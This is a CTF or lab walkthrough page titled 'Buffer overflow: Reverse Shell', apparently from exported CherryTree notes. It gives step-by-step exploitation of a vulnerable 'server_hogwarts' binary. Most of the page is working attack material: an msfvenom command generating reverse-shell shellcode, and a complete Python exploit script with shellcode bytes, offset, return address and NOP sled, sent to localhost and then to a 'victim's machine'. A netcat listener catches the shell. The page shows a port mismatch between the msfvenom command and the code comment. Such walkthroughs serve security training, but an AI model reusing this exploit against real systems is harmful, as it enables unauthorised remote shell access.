<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>4.5 Buffer overflow: Reverse Shell</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>4.5 Buffer overflow: Reverse Shell</h1><br/><br /><br /><strong>Test payload on the local machine</strong><br /><br />1. Create a reverse shell with “msfvenom” on you Kali Machine to exploit your local machine (Kali Machine).<br />    LHOST= Your Kali Machine IP.<br />   <br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$msfvenom</span>&nbsp;-p&nbsp;linux/x86/shell_reverse_tcp&nbsp;LHOST=192.168.12.10&nbsp;LPORT=8888&nbsp;-b&nbsp;<span style="color:#dd0000;font-weight:400">&quot;\x00&quot;</span>&nbsp;-f&nbsp;py<br /></div></div><br /><br />	<span style="color:#ffa500;">Output:</span>	<br />	<a href=""><img src="images/511-1.png" alt="images/511-1.png" /></a><br />	<br />	So, the final payload will look something like this: <code>shellcode = offset_value</code><em><code> + jmp_address + NOPS</code></em><code> + reverse_shell_code</code><br />	<br />2. Create a file called “genshell.py” on your Kali Machine with the following code. “payload” is the “msfvenom” output.<br />	<div class="codebox"><div class="codebox"><span style="color:#808080;font-weight:700">#!/usr/bin/python</span><br /><br /><span style="color:#007f1f;font-weight:400">import</span>&nbsp;sys,socket<br /><br /><span style="color:#808080;font-weight:400">#linux&nbsp;x86&nbsp;revshell&nbsp;-&nbsp;192.168.12.10&nbsp;@&nbsp;6666</span><br />buf&nbsp;=&nbsp;&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\xb8\x99\xc4\x19\x75\xda\xcb\xd9\x74\x24\xf4\x5f\x31</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\xc9\xb1\x12\x31\x47\x12\x03\x47\x12\x83\x76\x38\xfb</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\x80\xb9\x1a\x0b\x89\xea\xdf\xa7\x24\x0e\x69\xa6\x09</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\x68\xa4\xa9\xf9\x2d\x86\x95\x30\x4d\xaf\x90\x33\x25</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\xf0\xcb\xc8\xbf\x98\x09\xd1\x9d\xe0\x87\x30\x51\x76</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\xc8\xe3\xc2\xc4\xeb\x8a\x05\xe7\x6c\xde\xad\x96\x43</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\xac\x45\x0f\xb3\x7d\xf7\xa6\x42\x62\xa5\x6b\xdc\x84</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\xf9\x87\x13\xc6</span><span style="color:#dd0000;font-weight:400">&quot;</span><br /><br /><br /><br /><span style="color:#808080;font-weight:400">#0x08049d55</span><br /><span style="color:#808080;font-weight:400">#&quot;\x55\x9d\x04\x08&quot;</span><br /><br />shellcode&nbsp;=&nbsp;<span style="color:#dd0000;font-weight:400">&#39;A&#39;</span>*<span style="color:#b07e00;font-weight:400">112</span>&nbsp;+&nbsp;<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\x55\x9d\x04\x08</span><span style="color:#dd0000;font-weight:400">&quot;</span>&nbsp;+<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\x90</span><span style="color:#dd0000;font-weight:400">&quot;</span>*<span style="color:#b07e00;font-weight:400">32</span>&nbsp;+&nbsp;buf<br /><br />try:<br />&nbsp;&nbsp;&nbsp;&nbsp;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />&nbsp;&nbsp;&nbsp;&nbsp;s.connect((<span style="color:#dd0000;font-weight:400">&#39;127.0.0.1&#39;</span>,<span style="color:#b07e00;font-weight:400">9898</span>))<br />&nbsp;&nbsp;&nbsp;&nbsp;s.send((shellcode))<br />&nbsp;&nbsp;&nbsp;&nbsp;s.close()<br /><br />except:<br />&nbsp;&nbsp;&nbsp;&nbsp;print(<span style="color:#dd0000;font-weight:400">&quot;Error&nbsp;connecting&nbsp;to&nbsp;server&quot;</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()</div></div><br />	<br />3. Open a “netcat” connection on port 6666 on your Kali Machine.<br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$nc</span>&nbsp;-lvnp&nbsp;6666</div></div><br />	<br />5. Run the following command in another terminal.<br />	<div class="codebox"><div class="codebox">$./server_hogwarts&nbsp;|&nbsp;./genshell.py</div></div><br /><br />	<span style="color:#ffa500;">Output:</span>	<br />	<a href=""><img src="images/511-2.png" alt="images/511-2.png" /></a><br />	<br />	The payload works on your local machine.<br />	<br />	Note: If it doesn&#39;t work try several times “./server_hogwarts | ./genshell.py”<br /><br /><br /><strong>Modify code and try on the victim&#39;s machine<br /><br />1. </strong>Change the IP in the “./genshell.py” file to the victim&#39;s machine.<br />    s.connect((<span style="color:#dd0000;">&#39;192.168.12.20&#39;</span>,<span style="color:#b07e00;">9898</span>))<br /><br /><br />		<div class="codebox"><div class="codebox"><span style="color:#808080;font-weight:700">#!/usr/bin/python</span><br /><br /><span style="color:#007f1f;font-weight:400">import</span>&nbsp;sys,socket<br /><br /><span style="color:#808080;font-weight:400">#linux&nbsp;x86&nbsp;revshell&nbsp;-&nbsp;192.168.12.10&nbsp;@&nbsp;6666</span><br />buf&nbsp;=&nbsp;&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\xb8\x99\xc4\x19\x75\xda\xcb\xd9\x74\x24\xf4\x5f\x31</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\xc9\xb1\x12\x31\x47\x12\x03\x47\x12\x83\x76\x38\xfb</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\x80\xb9\x1a\x0b\x89\xea\xdf\xa7\x24\x0e\x69\xa6\x09</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\x68\xa4\xa9\xf9\x2d\x86\x95\x30\x4d\xaf\x90\x33\x25</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\xf0\xcb\xc8\xbf\x98\x09\xd1\x9d\xe0\x87\x30\x51\x76</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\xc8\xe3\xc2\xc4\xeb\x8a\x05\xe7\x6c\xde\xad\x96\x43</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\xac\x45\x0f\xb3\x7d\xf7\xa6\x42\x62\xa5\x6b\xdc\x84</span><span style="color:#dd0000;font-weight:400">&quot;</span><br />buf&nbsp;+=&nbsp;b<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\xf9\x87\x13\xc6</span><span style="color:#dd0000;font-weight:400">&quot;</span><br /><br /><br /><br /><span style="color:#808080;font-weight:400">#0x08049d55</span><br /><span style="color:#808080;font-weight:400">#&quot;\x55\x9d\x04\x08&quot;</span><br /><br />shellcode&nbsp;=&nbsp;<span style="color:#dd0000;font-weight:400">&#39;A&#39;</span>*<span style="color:#b07e00;font-weight:400">112</span>&nbsp;+&nbsp;<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\x55\x9d\x04\x08</span><span style="color:#dd0000;font-weight:400">&quot;</span>&nbsp;+<span style="color:#dd0000;font-weight:400">&quot;</span><span style="color:#ff00ff;font-weight:400">\x90</span><span style="color:#dd0000;font-weight:400">&quot;</span>*<span style="color:#b07e00;font-weight:400">32</span>&nbsp;+&nbsp;buf<br /><br />try:<br />&nbsp;&nbsp;&nbsp;&nbsp;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />&nbsp;&nbsp;&nbsp;&nbsp;s.connect((<span style="color:#dd0000;font-weight:400">&#39;192.168.12.20&#39;</span>,<span style="color:#b07e00;font-weight:400">9898</span>))<br />&nbsp;&nbsp;&nbsp;&nbsp;s.send((shellcode))<br />&nbsp;&nbsp;&nbsp;&nbsp;s.close()<br /><br />except:<br />&nbsp;&nbsp;&nbsp;&nbsp;print(<span style="color:#dd0000;font-weight:400">&quot;Error&nbsp;connecting&nbsp;to&nbsp;server&quot;</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()</div></div><br />		<br />2. Open a “netcat” connection on port 6666 on your Kali Machine.<br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$nc</span>&nbsp;-lvnp&nbsp;6666</div></div><br />	<br />3. Run the following command in another terminal.<br />	<div class="codebox"><div class="codebox">$./server_hogwarts&nbsp;|&nbsp;./genshell.py</div></div>		<br /><br />	<span style="color:#ffa500;">Output:</span>		<br />	<a href=""><img src="images/511-3.png" alt="images/511-3.png" /></a><br /><br />	You got a reverse shell.<br />	<br />4. Run the following code to see the “id”.<br />	<div class="codebox"><div class="codebox">id</div></div>		<br />	<br />	<span style="color:#ffa500;">Output:</span>			<br />	<a href=""><img src="images/511-4.png" alt="images/511-4.png" /></a><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>